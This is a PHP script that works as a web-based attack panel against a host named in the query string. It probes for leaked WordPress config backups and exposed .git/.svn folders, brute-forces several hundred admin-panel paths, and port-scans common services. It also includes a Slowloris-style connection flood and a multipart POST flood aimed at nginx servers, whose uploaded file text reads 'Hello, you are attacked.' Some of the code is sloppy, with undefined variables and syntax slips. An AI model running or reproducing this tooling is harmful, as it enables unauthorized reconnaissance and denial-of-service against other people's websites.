<?php
$host = $_GET['host'];
$requests = $_GET['req'];
$ip = gethostbyname($host);

echo '<ip>'.$ip.'</ip><br/>';

if(isset($_GET['head'])){
$a = get_headers($host);
foreach($a as $head){
echo '<header>'.$head.'</header>'.'<br/>';
}
}



if(isset($_GET['word'])){
$direc =  array('info.php', 'robots.txt', 'wp-config.php~','wp-config.php.save','test.php','wp-config.php.swp','wp-config.php.swp','wp-config.php.swo','wp-config.php_bak','index.php.bak','wp-config.old','wp-config.php1','wp-config.php2','wp-config.php.tmp','wp-config-backup.php','wp-config.bak', 'wp-config.php.bak', 'wp-config.save', 'wp-config.old', 'wp-config.php.old','wp-config.php.orig','wp-config.orig','wp-config.php.original', 'wp-config.original','wp-config.txt','.git','.svn','.htaccess','.git/info');

 foreach ($direc as $dir) {
    $res = get_headers($host.$dir);
    if(preg_match("|200|", $res[0])) {
        echo "<dir>$dir found</dir><br/>";
    }else{
        echo "<dirnot>$dir not found</dirnot><br/>";
    }
 }
}


if(isset($_GET['find'])){
    $admin = array("admin","administrator","adm","login","loign.php","administrator.php","admins.php","logins","admincp","admincp.php","admin1.php", "admin1.html", "admin2.php", "admin2.html", "yonetim.php", "yonetim.html", "yonetici.php", "yonetici.html", "ccms/", "ccms/login.php", "ccms/index.php", "maintenance/", "webmaster/", "adm/", "configuration/", "configure/", "websvn/", "admin/", "admin/account.php", "admin/account.html". "admin/index.php", "admin/index.html", "admin/login.php","admin/login.html", "admin/home.php", "admin/controlpanel.html", "admin/controlpanel.php", "admin.php", "admin.html", "admin/cp.php", "admin/cp.html", "cp.php", "cp.html", "administrator/","administrator/index.html", "administrator/index.php", "administrator/login.html", "administrator/login.php", "administrator/account.html", "administrator/account.php", "administrator.php","administrator.html", "login.php", "login.html", "modelsearch/login.php", "moderator.php", "moderator.html", "moderator/login.php", "moderator/login.html","moderator/admin.php","moderator/admin.html", "moderator/", "account.php", "account.html", "controlpanel/", "controlpanel.php", "controlpanel.html", "admincontrol.php", "admincontrol.html", "adminpanel.php","adminpanel.html", "admin1.asp", "admin2.asp", "yonetim.asp", "yonetici.asp", "admin/account.asp", "admin/index.asp", "admin/login.asp", "admin/home.asp", "admin/controlpanel.asp", "admin.asp", "admin/cp.asp", "cp.asp", "administrator/index.asp","administrator/login.asp","administrator/account.asp","administrator.asp", "login.asp", "modelsearch/login.asp", "moderator.asp","moderator/login.asp", "moderator/admin.asp", "account.asp", "controlpanel.asp", "admincontrol.asp", "adminpanel.asp", "fileadmin/", "fileadmin.php", "fileadmin.asp", "fileadmin.html","administration/", "administration.php", "administration.html", "sysadmin.php", "sysadmin.html", "phpmyadmin/", "myadmin/", "sysadmin.asp", "sysadmin/", "ur-admin.asp", "ur-admin.php","ur-admin.html", "ur-admin/", "Server.php", "Server.html", "Server.asp", "Server/", "wp-admin/", "administr8.php", "administr8.html", "administr8/", "administr8.asp", "webadmin/", "webadmin.php","webadmin.asp", "webadmin.html", "administratie/", "admins/", "admins.php", "admins.asp", "admins.html", "administrivia/", "Database_Administration/", "WebAdmin/", "useradmin/", "sysadmins/","admin1/", "system-administration/", "administrators/", "pgadmin/", "directadmin/", "staradmin/", "ServerAdministrator/", "SysAdmin/", "administer/", "LiveUser_Admin/", "sys-admin/", "typo3/","panel/", "cpanel/", "cPanel/", "cpanel_file/", "platz_login/", "rcLogin/", "blogindex/", "formslogin/", "autologin/", "support_login/", "meta_login/", "manuallogin/", "simpleLogin/", "loginflat/","utility_login/", "showlogin/", "memlogin/", "members/", "login-redirect/", "sub-login/", "wp-login/", "login1/", "dir-login/", "login_db/", "xlogin/", "smblogin/", "customer_login/", "UserLogin/","login-us/", "acct_login/", "admin_area/", "bigadmin/", "project-admins/", "phppgadmin/", "pureadmin/", "sql-admin/", "radmind/", "openvpnadmin/", "wizmysqladmin/", "vadmind/", "ezsqliteadmin/","hpwebjetadmin/", "newsadmin/", "adminpro/", "Lotus_Domino_Admin/", "bbadmin/", "vmailadmin/", "Indy_admin/", "ccp14admin/", "irc-macadmin/","banneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/", "admin4_account/","admin4_colon/","radmind-1/","SuperAdmin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/", "navSiteAdmin/","server_admin_small/","logo_sysadmin/","server/","database_administration/","power_user/", "system_administration/", "ss_vms_admin_sm/", "admin/","administrator/","admin1/","admin2/","admin3/","admin4/","admin5/","usuarios/","usuario/","administrator/","moderator/","webadmin/","adminarea/","bb-admin/","adminLogin/","admin_area/","panel-administracion/","instadmin/","memberadmin/","administratorlogin/","adm/","admin/account.js","admin/index.js","admin/login.js","admin/admin.js","admin/account.js","admin_area/admin.js","admin_area/login.js","siteadmin/login.js","siteadmin/index.js","siteadmin/login.html","admin/account.html","admin/index.html","admin/login.html","admin/admin.html","admin_area/index.js","bb-admin/index.js","bb-admin/login.js","bb-admin/admin.js","admin/home.js","admin_area/login.html","admin_area/index.html","admin/controlpanel.js","admin.js","admincp/index.asp","admincp/login.asp","admincp/index.html","admin/account.html","adminpanel.html","webadmin.html","webadmin/index.html","webadmin/admin.html","webadmin/login.html","admin/admin_login.html","admin_login.html","panel-administracion/login.html","admin/cp.js","cp.js","administrator/index.js","administrator/login.js","nsw/admin/login.js","webadmin/login.js","admin/admin_login.js","admin_login.js","administrator/account.js","administrator.js","admin_area/admin.html","pages/admin/admin-login.js","admin/admin-login.js","admin-login.js","bb-admin/index.html","bb-admin/login.html","bb-admin/admin.html","admin/home.html","login.js","modelsearch/login.js","moderator.js","moderator/login.js","moderator/admin.js","account.js","pages/admin/admin-login.html","admin/admin-login.html","admin-login.html","controlpanel.js","admincontrol.js","admin/adminLogin.html","adminLogin.html","admin/adminLogin.html","home.html","rcjakar/admin/login.js","adminarea/index.html","adminarea/admin.html","webadmin.js","webadmin/index.js","acceso.js","webadmin/admin.js","admin/controlpanel.html","admin.html","admin/cp.html","cp.html","adminpanel.js","moderator.html","administrator/index.html","administrator/login.html","user.html","administrator/account.html","administrator.html","login.html","modelsearch/login.html","moderator/login.html","adminarea/login.html","panel-administracion/index.html","panel-administracion/admin.html","modelsearch/index.html","modelsearch/admin.html","admincontrol/login.html","adm/index.html","adm.html","moderator/admin.html","user.js","account.html","controlpanel.html","admincontrol.html","panel-administracion/login.js","wp-login.js","adminLogin.js","admin/adminLogin.js","home.js","admin.js","adminarea/index.js","adminarea/admin.js","adminarea/login.js","panel-administracion/index.js","panel-administracion/admin.js","modelsearch/index.js","modelsearch/admin.js","admincontrol/login.js","adm/admloginuser.js","admloginuser.js","admin2.js","admin2/login.js","admin2/index.js","usuarios/login.js","adm/index.js","adm.js","affiliate.js","adm_auth.js","memberadmin.js","administratorlogin.js","admin/","administrator/","admin1/","admin2/","admin3/","admin4/","admin5/","usuarios/","usuario/","administrator/","moderator/","webadmin/","adminarea/","bb-admin/","adminLogin/","admin_area/","panel-administracion/","instadmin/","memberadmin/","administratorlogin/","adm/","admin/account.brf","admin/index.brf","admin/login.brf","admin/admin.brf","admin/account.brf","admin_area/admin.brf","admin_area/login.brf","siteadmin/login.brf","siteadmin/index.brf","siteadmin/login.html","admin/account.html","admin/index.html","admin/login.html","admin/admin.html","admin_area/index.brf","bb-admin/index.brf","bb-admin/login.brf","bb-admin/admin.brf","admin/home.brf","admin_area/login.html","admin_area/index.html","admin/controlpanel.brf","admin.brf","admincp/index.asp","admincp/login.asp","admincp/index.html","admin/account.html","adminpanel.html","webadmin.html","webadmin/index.html","webadmin/admin.html","webadmin/login.html","admin/admin_login.html","admin_login.html","panel-administracion/login.html","admin/cp.brf","cp.brf","administrator/index.brf","administrator/login.brf","nsw/admin/login.brf","webadmin/login.brfbrf","admin/admin_login.brf","admin_login.brf","administrator/account.brf","administrator.brf","acceso.brf","admin_area/admin.html","pages/admin/admin-login.brf","admin/admin-login.brf","admin-login.brf","bb-admin/index.html","bb-admin/login.html","bb-admin/admin.html","admin/home.html","login.brf","modelsearch/login.brf","moderator.brf","moderator/login.brf","moderator/admin.brf","account.brf","pages/admin/admin-login.html","admin/admin-login.html","admin-login.html","controlpanel.brf","admincontrol.brf","admin/adminLogin.html","adminLogin.html","admin/adminLogin.html","home.html","rcjakar/admin/login.brf","adminarea/index.html","adminarea/admin.html","webadmin.brf","webadmin/index.brf","webadmin/admin.brf","admin/controlpanel.html","admin.html","admin/cp.html","cp.html","adminpanel.brf","moderator.html","administrator/index.html","administrator/login.html","user.html","administrator/account.html","administrator.html","login.html","modelsearch/login.html","moderator/login.html","adminarea/login.html","panel-administracion/index.html","panel-administracion/admin.html","modelsearch/index.html","modelsearch/admin.html","admincontrol/login.html","adm/index.html","adm.html","moderator/admin.html","user.brf","account.html","controlpanel.html","admincontrol.html","panel-administracion/login.brf","wp-login.brf","adminLogin.brf","admin/adminLogin.brf","home.brf","admin.brf","adminarea/index.brf","adminarea/admin.brf","adminarea/login.brf","panel-administracion/index.brf","panel-administracion/admin.brf","modelsearch/index.brf","modelsearch/admin.brf","admincontrol/login.brf","adm/admloginuser.brf","admloginuser.brf","admin2.brf","admin2/login.brf","admin2/index.brf","usuarios/login.brf","adm/index.brf","adm.brf","affiliate.brf","adm_auth.brf","memberadmin.brf","administratorlogin.brf");
    foreach ($admin as $shell){
        $headers = get_headers($host.$shell);
        if(stristr($headers[0],"200")){
            echo "<admin><a href='$host$shell'>$host$shell</a> Founded!</admin>";
        }
    }
}

if(isset($_GET['port'])){
    //list of port numbers to scan
    $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);
    
    $results = array();
    foreach($ports as $port) {
        if($pf = @fsockopen($host, $port, $err, $err_string, 1)) {
            $results[$port] = true;
            fclose($pf);
        } else {
            $results[$port] = false;
        }
    }

    foreach($results as $port=>$val) {
        $prot = getservbyport($port,"tcp");
                echo "Port $port ($prot): ";
        if($val) {
            echo "<span style=\"color:green\">OK</span><br/>";
        }
        else {
            echo "<span style=\"color:red\">Inaccessible</span><br/>";
        }
    }
}

if(isset($_GET['slowloris'])){
for ($z = 0; $z <= $requests; $z++){


                    if (!empty($cache)) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    $sock[$z]=fsockopen($host,80,$errno,$errstr,$timeout);
                    $primarypayload ="GET /$rand HTTP/1.1\r\n";
                    $primarypayload .="Host: $sendhost\r\n";
                    $primarypayload .="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";
                    $primarypayload .="Content-Length: 42\r\n";
                      fwrite($sock[$z],$primarypayload);
                    if ($errno!=0) {
                            
                            fclose($sock[$z]);
                            $failed++;
                            $failedconnections++;
                        }
                    

                        
                        else {
                            $packetcount++;
                            
                        }
}
            for($z=0;$z<=$requests;$z++){
            fclose($sock[$z]);
}
}

if(isset($_GET['nginx'])){

  $ssl = false;
  $ip = '';
  $path = '/';
  $file = 'Hello, you are attacked.';
  $scheme = ($ssl ? 'ssl://' : '');
  $files = 20;
  $gvars = 1000;
  $grepeat = 1;
  $EOL = "\r\n";
  $body = '';

  for($i = 0; $i < $files; $i++){
    $body.='-----------------------------xxxxxxxxxxxx'.$EOL;
    $body.='Content-Disposition: form-data; name="future_temporary_file[]"; filename="future_temporary_file"'.$EOL;
    $body.='Content-Type: text/plain'.$EOL;
    $body.= $EOL;
    $body.= $file.$EOL;
  }
    
  for($i = 0; $i < $gvars; $i++){
    $body.='-----------------------------xxxxxxxxxxxx'.$EOL;
    $body.='Content-Disposition: form-data; name="some_garbage['.$i.']"'.$EOL;
    $body.= str_repeat('A', $grepeat).$EOL;
    $body.= $EOL;
  }
    
  $body.='-----------------------------xxxxxxxxxxxx--';
    
  $header ='POST '.$path.' HTTP/1.1'.$EOL;
  $header.='Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx'.$EOL;
  $header.='User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:56.0) Gecko/20160101 Firefox/56.0'.$EOL;
  $header.='Host: '.$host.$EOL;
  $header.='Content-Length: '.strlen($body).$EOL;
  $header.='Connection: close'.$EOL.$EOL;
  
  echo $EOL.($requests * $files).' files will be sent to '.$host.$EOL.$EOL;
  
  for($i = 1; $i <= $requests; $i++){
    echo 'Sending files #'.$i.' ';
    $fp = stream_socket_client($scheme.($ip ? $ip : $host).':'.($scheme ? 443 : 80), $errno, $errstr, 30);
    fwrite($fp, $header.$body);
    stream_socket_shutdown($fp, STREAM_SHUT_RDWR);
    fclose($fp);
    usleep(10000);
  }
}

?>
